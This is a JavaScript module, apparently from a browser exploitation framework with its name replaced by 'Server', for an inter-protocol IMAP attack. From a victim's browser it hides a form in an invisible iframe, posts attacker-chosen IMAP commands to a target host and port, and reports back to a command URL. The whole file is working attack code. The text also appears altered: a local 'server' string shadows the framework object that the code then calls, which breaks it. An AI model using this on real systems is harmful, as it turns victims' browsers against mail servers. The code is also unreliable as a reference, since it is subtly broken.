//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Inter protocol IMAP module
 * Ported from Server-0.4.0.0 by jgaliana (Original author: Wade)
 *
 */
server.execute(function() {

	var server = '<%= @server %>';
	var port = '<%= @port %>';
	var commands = '<%= @commands %>';

	var target = "http://" + server + ":" + port + "/abc.html";
	var iframe = server.dom.createInvisibleIframe();

	var form = document.createElement('form');
	form.setAttribute('name', 'data');
	form.setAttribute('action', target);
	form.setAttribute('method', 'post');
	form.setAttribute('enctype', 'multipart/form-data');

	var input = document.createElement('input');
	input.setAttribute('id', 'data1')
	input.setAttribute('name', 'data1')
	input.setAttribute('type', 'hidden');
	input.setAttribute('value', commands);
	form.appendChild(input);

	iframe.contentWindow.document.body.appendChild(form);
	form.submit();

	server.net.send("<%= @command_url %>", <%= @command_id %>, "result=IMAP4 commands sent");

});
